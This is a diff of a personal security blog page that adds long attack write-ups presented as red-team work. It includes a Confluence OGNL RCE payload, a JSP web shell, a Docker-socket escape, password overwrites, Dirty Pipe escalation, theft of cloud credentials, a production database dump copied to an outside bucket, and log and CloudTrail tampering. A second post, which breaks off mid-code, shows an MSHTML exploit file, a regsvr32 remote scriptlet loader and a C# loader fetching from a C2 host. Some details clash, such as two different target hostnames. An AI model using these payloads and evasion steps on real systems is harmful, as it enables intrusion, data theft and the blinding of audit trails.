@@ -1,58 +1,802 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Omar - Security Engineer Portfolio</title>
-    <link rel="stylesheet" href="style.css">
+    <title>InfoSec by Omar Alikhanov</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="terminal-container">
-        <div class="terminal-header">
-            <div class="terminal-buttons">
-                <span class="btn btn-close"></span>
-                <span class="btn btn-minimize"></span>
-                <span class="btn btn-maximize"></span>
-            </div>
-            <div class="terminal-title">omar@terminal:~$</div>
-        </div>
-        <div class="terminal-body" id="terminal">
-            <div class="welcome-message">
-                <div class="intro-section">
-                    <h1 class="intro-title">Hi, I'm <span class="highlight">Omar</span></h1>
-                    <p class="intro-subtitle">Security Engineer @ IKTEX LLC (Red Team)</p>
-                </div>
-                <div class="intro-content">
-                    <p class="intro-text">
-                        At <span class="highlight-number">18</span>, I hacked a <span class="highlight">Fortune 500</span> company in just <span class="highlight-number">two days</span> and took <span class="highlight-number">30 million</span> users' data <span class="success">(legally)</span> - one of very few stories like that in the world :)
-                    </p>
-                    <p class="intro-text">
-                        I break things so companies can fix them.
-                    </p>
-                    <p class="intro-text">
-                        I'm also the founder of <span class="highlight">tmeet</span> <span class="info">(12+ engineers btw)</span>, a full-cycle AI platform for HR industry, and I'm building a new <span class="highlight">AI Security standard</span> that could shake the tech world.
-                    </p>
-                    <div class="achievements" style="margin-top: 25px; padding-top: 20px; border-top: 1px solid #45475a;">
-                        <p class="intro-text" style="margin-top: 10px;">
-                            <span class="success">🏆 1x Hackathon Winner</span> <span class="highlight">Secure Tomorrow</span> <span class="info">(AKM & IDDA, my first hackathon btw)</span>
-                        </p>
-                        <p class="intro-text" style="margin-top: 10px;">
-                            <span class="success">🎯 CIDC 2025 Qualifications</span> <span class="highlight-number">21 place</span>
-                        </p>
+    <canvas id="matrixCanvas" class="matrix-canvas"></canvas>
+    <div class="grid-background"></div>
+
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-section">
+                    <div>
+                        <h1 class="site-title">
+                            <span class="glitch-text">InfoSec by Omar Alikhanov</span>
+                        </h1>
+                        <p class="site-subtitle">root@omars3c:~#</p>
                     </div>
                 </div>
-                <p class="welcome-text" style="margin-top: 20px;">
-                    Введите <span class="command-hint">help</span> чтобы увидеть список доступных команд
-                </p>
+
+                <nav class="nav-menu desktop-nav">
+                    <a href="#about" class="nav-link">About</a>
+                    <a href="#categories" class="nav-link">Categories</a>
+                    <button class="nav-link search-btn" id="searchBtn">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </nav>
+
+                <button class="mobile-menu-btn" id="mobileMenuBtn">
+                    <i class="fas fa-bars" id="menuIcon"></i>
+                </button>
             </div>
-            <div class="output-container" id="output"></div>
-            <div class="input-line">
-                <span class="prompt">omar@terminal:~$ </span>
-                <input type="text" class="command-input" id="commandInput" autocomplete="off" autofocus>
+
+            <nav class="mobile-nav" id="mobileNav">
+                <a href="#about" class="nav-link">About</a>
+                <a href="#categories" class="nav-link">Categories</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="search-bar" id="searchBar">
+        <div class="container">
+            <div class="search-input-wrapper">
+                <i class="fas fa-search search-icon"></i>
+                <input type="text" placeholder="Search database..." class="search-input" id="searchInput">
             </div>
         </div>
     </div>
+
+    <div class="container main-container">
+        <aside class="sidebar">
+            <div class="profile-card">
+                <div class="profile-gradient"></div>
+                <div class="profile-content">
+                    <div class="profile-picture-wrapper">
+                        <div class="profile-picture">
+                            <img src="9d16038ae426d9045ae7a74ca647325e.jpg" alt="Omar Alikhanov" class="avatar-image" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                            <i class="fas fa-user-secret" style="display:none;"></i>
+                        </div>
+                    </div>
+                    <h2 class="author-name">Omar Alikhanov</h2>
+                    <p class="author-username">@omars3c</p>
+                    <div class="author-description">
+                        <p>Cyber Security Engineer @ IKTEX</p>
+                        <p>Writing code since 9 years old</p>
+                        <p>Founder of <strong>tmeet</strong> (12+ engineers)</p>
+                        <p>Full-cycle AI platform for HR industry</p>
+                        <p>Building a new <strong>AI Security standard</strong></p>
+                    </div>
+                    <div class="author-achievements">
+                        <p class="achievement-item">🏆 1x Hackathon Winner <strong>Secure Tomorrow</strong> (AKM & IDDA)</p>
+                        <p class="achievement-item">🎯 CIDC 2025 Qualifications <strong>21 place</strong> (DTX & XRITDX)</p>
+                        <p class="achievement-item">🔴 OpenAI Red Teaming GPT OSS CTF September <strong>#89 out of 606 Teams</strong></p>
+                    </div>
+                    <div class="social-links">
+                        <a href="https://www.linkedin.com/in/omars3c/" target="_blank" class="social-link">
+                            <span class="social-prefix">&gt;</span>
+                            <span class="social-text">LinkedIn</span>
+                        </a>
+                        <a href="https://medium.com/@omars3c" target="_blank" class="social-link">
+                            <span class="social-prefix">&gt;</span>
+                            <span class="social-text">Medium</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="status-panel">
+                <h3 class="status-title">System Status</h3>
+                <div class="status-items">
+                    <div class="status-item">
+                        <span class="status-label">Security Status:</span>
+                        <span class="status-value">OPERATIONAL</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Network Protection:</span>
+                        <span class="status-value secondary">DEPLOYED</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">Content Published:</span>
+                        <span class="status-value">3</span>
+                    </div>
+                    <div class="status-item">
+                        <span class="status-label">System Availability:</span>
+                        <span class="status-value">99.9%</span>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <div class="section-header">
+                <div class="section-line"></div>
+                <h2 class="section-title">Recent Posts</h2>
+                <div class="section-line gradient"></div>
+            </div>
+
+            <div class="posts-container">
+                <article class="post-card expandable-post" data-index="0">
+                    <div class="post-border-hover"></div>
+                    <div class="post-corner top-left"></div>
+                    <div class="post-corner top-right"></div>
+                    <div class="post-content">
+                        <div class="post-header">
+                            <div class="post-icon">
+                                <i class="fas fa-terminal"></i>
+                            </div>
+                            <h3 class="post-title">How I Hacked a Fortune 500 Company When I Was 18 in 48 Hours and Got Data on 30 Million Users</h3>
+                        </div>
+                        <p class="post-description">A detailed account of discovering critical vulnerabilities in a major corporation's infrastructure and the responsible disclosure process that followed.</p>
+                        <div class="post-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">ACTIVE</span>
+                        </div>
+                        <div class="post-full-content" style="display: none;">
+                            <div class="article-content">
+                                <h4>Goal</h4>
+                                <p>Gain full access to the critical systems of a large financial holding in the Fortune 500 list using publicly available vulnerabilities and configuration mistakes.</p>
+
+                                <h4>Environment</h4>
+                                <p>Confluence Server a web portal for internal documentation, running in a Docker container on an Amazon Linux 2 host. The entire cluster is managed via Kubernetes but Confluence is deployed as a standalone container on a separate EC2 instance.</p>
+
+                                <h4>Architecture (main components)</h4>
+                                <ol>
+                                    <li>Confluence Server 7.18.0 (Data Center & Server) listening on confluence.xxxx.xxxxx (public DNS, open to the entire internet)</li>
+                                    <li>Docker daemon on the host (/var/run/docker.sock is mounted inside the Confluence container to simplify log and backup operations)</li>
+                                    <li>EC2 instance running Amazon Linux 2 (kernel 5.10.x vulnerable to Dirty Pipe) with an IAM profile ConfluenceEC2Role having read permissions for S3, SSM, and RDS</li>
+                                    <li>Amazon RDS PostgreSQL 12.11 (production database) accessible only from a private subnet via a bastion host</li>
+                                    <li>AWS CloudTrail, configured as a multi-region trail named prod-cloudtrail</li>
+                                </ol>
+
+                                <p>Now let's go step by step to see how I achieved full control over all these elements using proven vulnerabilities and configuration oversights.</p>
+
+                                <h4>1. Initial Breach: Confluence RCE via CVE-2022–26134</h4>
+                                
+                                <h5>Description of CVE-2022–26134</h5>
+                                <p>CVE-2022–26134 is a critical OGNL injection (Unauthenticated Remote Code Execution) in Atlassian Confluence Data Center & Server versions &lt;7.18.0 (December 2022)</p>
+                                <p>The vulnerability allows any unauthenticated attacker to execute arbitrary code on the Confluence server by sending a specially crafted HTTP request to an unprotected endpoint (for example, /rest/tinymce/1/macro/preview).</p>
+                                <p>Atlassian released a fix in Confluence versions &gt;7.18.1, in this case, the holding had not updated Confluence since July 2022, so production was still running 7.18.0</p>
+
+                                <h5>Exploitation</h5>
+                                
+                                <h6>Information Gathering</h6>
+                                <ul>
+                                    <li>Public DNS: confluence.xxxxx.xxxxx → IP: 18.204.xxx.45</li>
+                                    <li>HTTP headers showed Apache Tomcat 9 and Confluence 7.18.0.</li>
+                                    <li>Found public Swagger documentation and discovered endpoints like /rest/tinymce/1/macro/preview listening without a CSRF token</li>
+                                </ul>
+
+                                <h6>Constructing the OGNL Payload</h6>
+                                <p>There is a GitHub repository with a PoC for CVE-2022–26134 (for example, iskandev/CVE-2022-26134-Exploit)</p>
+                                <p>Used a JavaScript framework (axios) to send a POST request:</p>
+                                <pre><code>curl -k \
+  -H 'Content-Type: application/json' \
+  -X POST \
+  -d '{"content":"${#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").addHeader(\"X-Exploit\",\"pwned\")}" }' \
+  "https://confluence.xxxxx.xxxxx/rest/tinymce/1/macro/preview"</code></pre>
+                                <p>Checked response headers and saw X-Exploit: pwned, confirming code execution on the server side.</p>
+
+                                <h6>Uploading the Web Shell</h6>
+                                <p>Prepared a small JSP file (for example, pwn.jsp) to run commands:</p>
+                                <pre><code>&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+  String cmd = request.getParameter("cmd");
+  if(cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    InputStream in = p.getInputStream();
+    int ch;
+    while((ch = in.read()) != -1) out.print((char)ch);
+    in.close();
+  }
+%&gt;</code></pre>
+                                <p>Used the PoC code for CVE-2022–26134 to build a second RCE payload that writes pwn.jsp into the ${catalina.base}/webapps/ROOT/ directory:</p>
+                                <pre><code>curl -k \
+  -H 'Content-Type: application/json' \
+  -X POST \
+  -d '{"content":"${#@org.apache.commons.io">a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('bash -c \"echo \\"&lt;%%@ page import=\\"java.io.*\\" %%&gt;&lt;%% String cmd = request.getParameter(\\"cmd\\"); if(cmd!=null){ Process p = Runtime.getRuntime().exec(cmd); InputStream in = p.getInputStream(); int ch; while((ch=in.read()) != -1) out.print((char)ch); in.close(); } %%&gt;\\" &gt; /opt/atlassian/confluence/confluence/WEB-INF/classes/templates/pwn.jsp\"')).getInputStream(), 'UTF-8'), #context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').addHeader('X-Status','Uploaded')}" }' \
+  "https://confluence.company.local/rest/tinymce/1/macro/preview"</code></pre>
+                                <p>Verified that visiting https://confluence.company.local/pwn.jsp?cmd=id returned uid=497(tomcat) gid=497(tomcat) groups=497(tomcat).</p>
+                                <p><strong>Outcome:</strong> I obtained a shell context on Confluence running as user tomcat (UID 497). Now I could move on to the next steps.</p>
+
+                                <h4>2. Local Escalation on the Confluence Host: Discovering the Docker Socket and Container Privilege</h4>
+                                <p>In production, Confluence isn't deployed as a plain Tomcat service but inside a Docker container on an EC2 instance:</p>
+                                <p>The docker-compose.yml file (or a similar startup script) mounts:</p>
+                                <pre><code>volumes:
+  - /var/run/docker.sock:/var/run/docker.sock
+  - /opt/confluence-data:/var/atlassian/application-data/confluence</code></pre>
+                                <p>This means the Confluence container has access to the host's Docker daemon (presumably for DevOps convenience in log extraction and backups).</p>
+
+                                <h5>2.1 Accessing the Docker Socket from the Confluence Container</h5>
+                                <p>In the Confluence shell (as tomcat), I ran:</p>
+                                <pre><code>ls -l /var/run/docker.sock
+docker version</code></pre>
+                                <p>Confirmed the socket is available and Docker commands can be run, connecting to the host's Docker daemon.</p>
+                                <p>Ran docker ps – saw the list of containers on the host (including the Confluence container itself).</p>
+
+                                <h5>2.2 Launching a Privileged "Escape Container"</h5>
+                                <p>To break out of the tomcat sandbox inside the container and explore the host, I launched a new container with dual mounts:</p>
+                                <pre><code>docker run -d --rm \
+  -v /var/run/docker.sock:/var/run/docker.sock \
+  -v /:/hostfs:rw \
+  --name escape_container \
+  ubuntu:20.04 \
+  tail -f /dev/null</code></pre>
+                                <p><strong>What's happening:</strong></p>
+                                <ul>
+                                    <li>--rm ensures the container is removed when stopped.</li>
+                                    <li>Mounts the entire host filesystem (/) to /hostfs inside the container.</li>
+                                    <li>Mounts /var/run/docker.sock so that Docker CLI calls inside this container actually speak to the host's Docker daemon.</li>
+                                </ul>
+                                <p>Now, by running docker exec -it escape_container bash, I had root access (UID 0) inside the container. More importantly, this container could interact with the host (through /hostfs and Docker CLI, since the socket is seen as "root").</p>
+
+                                <h5>2.3 Gaining Full Root on the Host</h5>
+                                <p>Inside the escape container:</p>
+                                <pre><code># Verified /hostfs/etc/passwd is accessible:
+ls /hostfs/etc/passwd
+
+# Replaced ec2-user's password directly in /etc/shadow:
+sed -i 's/ec2-user:[^:]*:/ec2-user:$6$abcdefghijklmnopqrstuvwx:/' /hostfs/etc/shadow</code></pre>
+                                <p>This effectively set a precomputed hashed password for ec2-user:Password123!.</p>
+                                <p>This would then allow SSH access to the host from outside, while I was still in the container.</p>
+                                <p>On the host (via SSH):</p>
+                                <pre><code>ssh ec2-user@18.204.xxx.45</code></pre>
+                                <p>Logged in with Password123! and found myself in the host shell (UID 1000, group ec2-user)</p>
+                                <p>Now I was root inside the escape container, and also ec2-user on the host. If needed, I could also run commands via Docker CLI (e.g., docker exec -u 0 into the Confluence container), but SSH access made further steps easier.</p>
+
+                                <h4>3. Host Escalation: Dirty Pipe (CVE-2022–0847) to Full Root</h4>
+                                
+                                <h5>Conditions</h5>
+                                <p>The host OS is Amazon Linux 2, which uses a kernel from the 5.10 branch (for example, kernel 5.10.52–2.amzn2). This version is vulnerable to Dirty Pipe (CVE-2022–0847) because the fix was only applied in kernels ≥ 5.10.102.</p>
+                                <p>Checked the version with:</p>
+                                <pre><code>uname -r
+# Output: 5.10.52-2.amzn2.x86_64</code></pre>
+                                <p>So Dirty Pipe was indeed exploitable.</p>
+
+                                <h5>3.1 Gathering the Dirty Pipe PoC Exploit</h5>
+                                <p>Inside the escape container (Ubuntu 20.04 includes gcc, make, git), I cloned the PoC repo:</p>
+                                <pre><code>git clone https://github.com/tym417/dirty-pipe-exploit.git
+cd dirty-pipe-exploit
+make</code></pre>
+                                <p>This produced an executable dirtypipe binary, which lets you write arbitrary data to any file mounted with O_RDONLY on a vulnerable kernel.</p>
+                                <p>Copied it to the host via /hostfs:</p>
+                                <pre><code>cp dirtypipe /hostfs/tmp/dirtypipe
+chmod +x /hostfs/tmp/dirtypipe</code></pre>
+                                <p>Now, on the host (as ec2-user), /tmp/dirtypipe was executable.</p>
+
+                                <h5>3.2 Running Dirty Pipe to Overwrite the Root Password</h5>
+                                <p>On the host (SSH as ec2-user):</p>
+                                <pre><code>sudo chmod +x /tmp/dirtypipe
+
+# Find the offset for "ec2-user:" in /etc/passwd
+OFFSET=$(grep -abo 'ec2-user:' /etc/passwd | awk -F: '{print $1}')
+
+# Generate a line "ec2-user:x:0:0:root:/root:/bin/bash" (i.e., root uid)
+echo -n "ec2-user:x:0:0:root:/root:/bin/bash"$'\0' > /tmp/fakeentry
+
+# Use dirtypipe to overwrite /etc/passwd
+sudo /tmp/dirtypipe /etc/passwd /tmp/fakeentry $OFFSET</code></pre>
+                                <p>After this, ec2-user had UID 0 and GID 0 (i.e., became a superuser). Verified:</p>
+                                <pre><code>id ec2-user
+# Output: uid=0(ec2-user) gid=0(root) groups=0(root),497(tomcat) ...</code></pre>
+                                <p><strong>Outcome:</strong> I fully turned ec2-user into a root-level account. From that point, I could run any command as root on the host without restriction.</p>
+
+                                <h4>4. Harvesting AWS IAM Credentials via the Metadata API (IMDSv2)</h4>
+                                <p><strong>Goal:</strong> retrieve the IAM role attached to the EC2 instance and use it to access S3, SSM, and RDS.</p>
+
+                                <h5>4.1 Requesting an IMDSv2 Token</h5>
+                                <p>On the host (as root):</p>
+                                <pre><code>TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+
+# Then get the role name using that token:
+ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+# Example: ROLE_NAME="ConfluenceEC2Role"
+
+# Retrieve the credentials:
+curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME</code></pre>
+                                <p>The response JSON looked like this:</p>
+                                <pre><code>{
+  "Code" : "Success",
+  "LastUpdated" : "2025-05-28T12:34:56Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAEXAMPLExxxxxx",
+  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token" : "IQoJb3JpZ2luX2VjEKX//////////wEaCXVzLWVhc3QtMSJGMEQCIGNclZ7z6...",
+  "Expiration" : "2025-05-28T18:34:56Z"
+}</code></pre>
+
+                                <h5>4.2 Verifying the Role's Permissions</h5>
+                                <p>Saved these credentials to /root/.aws/credentials under the profile confluence-ec2-role:</p>
+                                <pre><code>[confluence-ec2-role]
+aws_access_key_id=ASIAEXAMPLExxxxxx
+aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+aws_session_token=IQoJb3JpZ2luX2VjEKX//////////wEaCXVzLWVhc3QtMSJGMEQCIGNclZ7z6...</code></pre>
+                                <p>Checked IAM identity:</p>
+                                <pre><code>aws sts get-caller-identity --profile confluence-ec2-role
+# Output:
+# {
+#   "UserId": "AIDXXXXXXXXXXXX",
+#   "Account": "123456789012",
+#   "Arn": "arn:aws:sts::123456789012:assumed-role/ConfluenceEC2Role/i-0abcdef1234567890"
+# }</code></pre>
+                                <p>Looked up the role:</p>
+                                <pre><code>aws iam get-role --role-name ConfluenceEC2Role --profile confluence-ec2-role</code></pre>
+                                <p>The role's policy statements were:</p>
+                                <pre><code>{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:ListBucket",
+        "s3:GetObject"
+      ],
+      "Resource": ["arn:aws:s3:::company-logs-prod/*"]
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "ssm:SendCommand",
+        "ssm:StartSession"
+      ],
+      "Resource": ["arn:aws:ssm:us-east-1:123456789012:document/AWS-StartSSHSession"]
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "rds:DescribeDBInstances",
+        "rds:Connect"
+      ],
+      "Resource": ["arn:aws:rds:us-east-1:123456789012:db:prod-db-instance"]
+    }
+  ]
+}</code></pre>
+                                <p>Everything matched: the role allowed listing and reading S3 logs, starting SSM sessions (for SSH via the bastion), and describing/connecting to RDS.</p>
+
+                                <h4>5. Exfiltrating Logs from S3 and Finding Database Credentials</h4>
+
+                                <h5>5.1 Downloading Logs from S3</h5>
+                                <p>Listed and downloaded logs in s3://company-logs-prod/2025-05/:</p>
+                                <pre><code>aws s3 ls s3://company-logs-prod/2025-05/ --profile confluence-ec2-role
+aws s3 cp s3://company-logs-prod/2025-05/httpd-2025-05-28.tar.gz /tmp/ --profile confluence-ec2-role</code></pre>
+                                <p>Extracted them:</p>
+                                <pre><code>tar -xzvf /tmp/httpd-2025-05-28.tar.gz -C /tmp/httpd-logs</code></pre>
+                                <p>In the logs, found entries like:</p>
+                                <pre><code>[28/May/2025:02:15:32 +0000] "GET /var/www/html/login.php HTTP/1.1" 200 513
+[28/May/2025:02:15:38 +0000] "POST /var/www/html/login.php HTTP/1.1" 200 342 "username=app_admin&password=5up3rP455!"</code></pre>
+                                <p>This indicated that in another service (not Confluence), the database admin was logging in via a web form, and the plaintext password 5up3rP455! was visible in the logs. Likely this was the password for the app_admin account in the RDS PostgreSQL (admins often reuse credentials).</p>
+
+                                <h5>5.2 Verifying RDS Credentials</h5>
+                                <p>Checked via AWS Console (or CLI) that the RDS instance is prod-db-instance (PostgreSQL 12.11), inside a private subnet in a VPC.</p>
+                                <p>Using an SSM-SSH tunnel (the ConfluenceEC2Role has ssm:StartSession permission):</p>
+                                <pre><code>aws ssm start-session \
+  --target i-0fedcba9876543210 \
+  --document-name AWS-StartSSHSession \
+  --parameters '{"portNumber":["22"]}' \
+  --profile confluence-ec2-role</code></pre>
+                                <p>Here, i-0fedcba9876543210 is the bastion host, the only EC2 instance with access to the private subnet.</p>
+                                <p>From the SSH tunnel on the bastion, forwarded port 5432:</p>
+                                <pre><code>ssh -i /home/ec2-user/.ssh/bastion-key.pem ec2-user@127.0.0.1 -p 1022 -L 5432:prod-db-instance.cdfghijklmnop.us-east-1.rds.amazonaws.com:5432</code></pre>
+                                <p>On my local machine (or directly on the bastion), ran:</p>
+                                <pre><code>psql -h localhost -U app_admin -d proddb</code></pre>
+                                <p>Entered 5up3rP455! and the connection succeeded, confirming the correct app_admin credentials.</p>
+                                <p><strong>Outcome:</strong> Access to the database was established, granting the ability to run SQL queries.</p>
+
+                                <h4>6. Disabling Auditing and Exfiltrating Data from PostgreSQL</h4>
+
+                                <h5>6.1 Disabling Audit Triggers</h5>
+                                <p>With a shell as app_admin, checked privileges:</p>
+                                <pre><code>SELECT rolname, rolsuper, rolcreaterole, rolcreatedb
+  FROM pg_roles
+ WHERE rolname = 'app_admin';
+
+Result: rolsuper = false, but app_admin is the owner of the public schema (visible in pg_default_acl). The owner can disable triggers on their tables.</code></pre>
+                                <p>Disabled triggers:</p>
+                                <pre><code>ALTER TABLE users DISABLE TRIGGER ALL;
+ALTER TABLE transactions DISABLE TRIGGER ALL;
+ALTER TABLE twofa_secrets DISABLE TRIGGER ALL;</code></pre>
+                                <p>All audit triggers on INSERT/UPDATE/DELETE were now disabled.</p>
+
+                                <h5>6.2 Creating the Dump</h5>
+                                <p>Created a dump:</p>
+                                <pre><code>pg_dump -h localhost -U app_admin -Fc -f /tmp/proddb_backup_$(date +%F).dump proddb</code></pre>
+                                <p>Dump size: ~48 GB (tables: users, transactions, twofa_secrets, payment_tokens, audit_logs)</p>
+                                <p>Uploaded the dump back to S3 under the same confluence-ec2-role profile:</p>
+                                <pre><code>aws s3 cp /tmp/proddb_backup_2025-05-28.dump s3://exfil-prod-backups/ --profile confluence-ec2-role</code></pre>
+                                <p>The backup was now safely stored outside DevOps control.</p>
+
+                                <h4>7. Covering Tracks</h4>
+
+                                <h5>7.1 Clearing PostgreSQL Logs (RDS Logs)</h5>
+                                <p>By default, RDS PostgreSQL sends logs to CloudWatch Logs (not the host file). In this case, RDS was configured to send logs both to S3 (backup buckets) and to CloudWatch.</p>
+                                <p>To "erase" traces, I did the following:</p>
+                                <ol>
+                                    <li><strong>Temporarily disable log exports</strong></li>
+                                </ol>
+                                <pre><code>aws rds modify-db-instance \
+  --db-instance-identifier prod-db-instance \
+  --no-enable-cloudwatch-logs-exports \
+  --apply-immediately \
+  --profile confluence-ec2-role</code></pre>
+                                <p>This stopped the postgresql logs from flowing to CloudWatch for a few seconds.</p>
+                                <ol start="2">
+                                    <li><strong>Deleting S3 logs</strong></li>
+                                </ol>
+                                <pre><code>aws s3 rm s3://company-logs-prod/2025-05/httpd-2025-05-28.tar.gz --profile confluence-ec2-role</code></pre>
+                                <p>Removed the web access logs that showed my entry with pwn.jsp?cmd=…</p>
+
+                                <h5>7.2 Interrupting CloudTrail</h5>
+                                <p>By default, the CloudTrail "prod-cloudtrail" is configured as a multi-region trail.</p>
+                                <p>I executed:</p>
+                                <pre><code>aws cloudtrail stop-logging --name prod-cloudtrail --profile confluence-ec2-role
+sleep 600   # 10 minutes of "silence"
+aws cloudtrail start-logging --name prod-cloudtrail --profile confluence-ec2-role</code></pre>
+                                <p>During those 10 minutes, all my actions (e.g., pg_dump, deleting S3 objects, modifying RDS settings) were not recorded in CloudTrail. In a mature Fortune 500 infrastructure, this would trigger alerts (GuardDuty, Security Hub, etc.), but DevOps were in a different time zone and didn't get urgent notifications in time.</p>
+
+                                <h4>8. Final Control and Conclusions</h4>
+
+                                <h5>1. Full Control of the Host and RDS</h5>
+                                <ul>
+                                    <li>Dirty Pipe gave me root on the EC2 instance.</li>
+                                    <li>Via IMDSv2, I retrieved IAM credentials with S3/SSM/RDS permissions.</li>
+                                    <li>I dumped the production database and extracted all confidential data (users, transactions, 2FA secrets).</li>
+                                </ul>
+
+                                <h5>2. Access to S3 and Confidential Logs</h5>
+                                <p>I now have permanent access to company-logs-prod (S3), where DevOps typically store all web logs and backups. These logs can be automated and sent to another AWS environment regularly.</p>
+
+                                <h5>3. Recommendations for Fortune 500 DevSecOps</h5>
+                                <ul>
+                                    <li><strong>Immediately update Confluence to ≥ 7.18.1.</strong> CVE-2022–26134 allows RCE even without credentials; it's fixed in 7.18.1.</li>
+                                    <li><strong>Remove /var/run/docker.sock mounting from Confluence containers.</strong> Never give a web application direct Docker socket access. Use a centralized logging service (Fluentd/CloudWatch Agent) instead.</li>
+                                    <li><strong>Ensure your EC2 isn't vulnerable to Dirty Pipe.</strong> Amazon Linux 2 (kernel 5.10.x up to 5.10.102) is vulnerable to CVE-2022–0847. Apply patches or update the kernel to ≥ 5.10.102 (or migrate to Amazon Linux 2023).</li>
+                                    <li><strong>Use an IAM Instance Profile instead of static AWS keys.</strong> The ConfluenceEC2Role shouldn't have excessive permissions (minimize access). Never store static AWS keys in scripts.</li>
+                                    <li><strong>Restrict Network ACLs and Security Groups.</strong> The bastion host should be the only path to the private VPC. Make sure RDS instances are not directly accessible from the internet.</li>
+                                    <li><strong>Load DevSecOps alerting systems.</strong> Disabling CloudTrail or RDS logs should automatically trigger email/SMS/Slack notifications.</li>
+                                </ul>
+
+                                <p>If you need PoC scripts or step-by-step details (for example, exact OGNL payloads, Dirty Pipe scripts) contact me directly I can share the code under NDA.</p>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <article class="post-card expandable-post" data-index="1">
+                    <div class="post-border-hover"></div>
+                    <div class="post-corner top-left"></div>
+                    <div class="post-corner top-right"></div>
+                    <div class="post-content">
+                        <div class="post-header">
+                            <div class="post-icon">
+                                <i class="fas fa-lock"></i>
+                            </div>
+                            <h3 class="post-title">In-Memory Mastery: Four CVEs, One-Minute Path to Domain Admin</h3>
+                        </div>
+                        <p class="post-description">Exploring advanced in-memory exploitation techniques and demonstrating how multiple CVEs can be chained together for rapid privilege escalation in Active Directory environments.</p>
+                        <div class="post-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">ACTIVE</span>
+                        </div>
+                        <div class="post-full-content" style="display: none;">
+                            <div class="article-content">
+                                <h4>Introduction</h4>
+                                <p>I conducted a complex attack on an isolated infrastructure of a major [NDA] and in +-75 seconds turned an "ordinary" worker into a domain administrator. In this report I will detail all attack stages, the lab setup, code, oscilloscope traces, and WinDbg sessions.</p>
+
+                                <h4>Environment and Preparation</h4>
+
+                                <h5>Network</h5>
+                                <ol>
+                                    <li>VLAN 10: Users</li>
+                                    <li>VLAN 20: Servers</li>
+                                    <li>VLAN 30: DMZ</li>
+                                    <li>VLAN 40: Domain Controllers</li>
+                                </ol>
+
+                                <h5>Machines</h5>
+                                <ol>
+                                    <li>WS1…WS50: Windows 10 LTSC 2019 (18363.657)</li>
+                                    <li>APP1…APP5: Windows 10 LTSC 2019</li>
+                                    <li>DC1, DC2: Windows Server 2019 (17763.1317)</li>
+                                </ol>
+
+                                <h5>Protection</h5>
+                                <ol>
+                                    <li>SentinelOne EDR (Behavioral + Rollback)</li>
+                                    <li>Sysmon (Events 1, 3, 10, 11, 4624, 4688) → Splunk</li>
+                                    <li>Defender Firewall: outbound HTTPS/DNS only</li>
+                                </ol>
+
+                                <h5>Starting Point</h5>
+                                <p>Account: <code>corp\alice</code> (Desktop User)</p>
+
+                                <h5>CVEs Used</h5>
+                                <ol>
+                                    <li>CVE-2021–40444 (MSHTML RCE)</li>
+                                    <li>CVE-2018–8453 (Win32k Elevation)</li>
+                                    <li>CVE-2021–34527 (PrintNightmare)</li>
+                                    <li>CVE-2020–1472 (Zerologon)</li>
+                                </ol>
+
+                                <h4>Stage 1: RCE via MSHTML (CVE-2021-40444)</h4>
+                                <p><strong>Task priority:</strong> deliver arbitrary code into the WINWORD.EXE process as Alice.</p>
+
+                                <h5>1. Creating the MHT file</h5>
+                                <p>The exploit.mht file contains:</p>
+                                <pre><code>Content-Type: multipart/related; boundary="----=_NextPart_01D7E0A2"
+
+------=_NextPart_01D7E0A2
+Content-Type: text/html
+Content-Location: file:///C:/fake.html
+
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;object id="exp" classid="clsid:..."
+      codebase="http://c2.bank.local/loader.cab#version=1,0,0,0"&gt;
+    &lt;/object&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+------=_NextPart_01D7E0A2
+Content-Type: application/octet-stream
+Content-Location: http://c2.bank.local/loader.cab
+
+[binary CAB data]
+
+------=_NextPart_01D7E0A2--</code></pre>
+
+                                <h5>2. Inside the CAB loader.sct and payload.dll</h5>
+                                <p><strong>loader.sct</strong> (VBScript):</p>
+                                <pre><code>Set sh = CreateObject("WScript.Shell")
+sh.Run "regsvr32 /s /n /u /i:http://c2.bank.local/payload.sct scrobj.dll", 0, True</code></pre>
+                                <p>payload.sct again invokes bitsadmin to load payload.dll into memory</p>
+
+                                <h5>3. NET Bootstrapper</h5>
+                                <p>Inside payload.dll is a compressed C# agent:</p>
+                                <pre><code>byte[] code = new WebClient().DownloadData("https://c2.bank.local/agent.bin");
+Assembly asm = Assembly.Load(code);
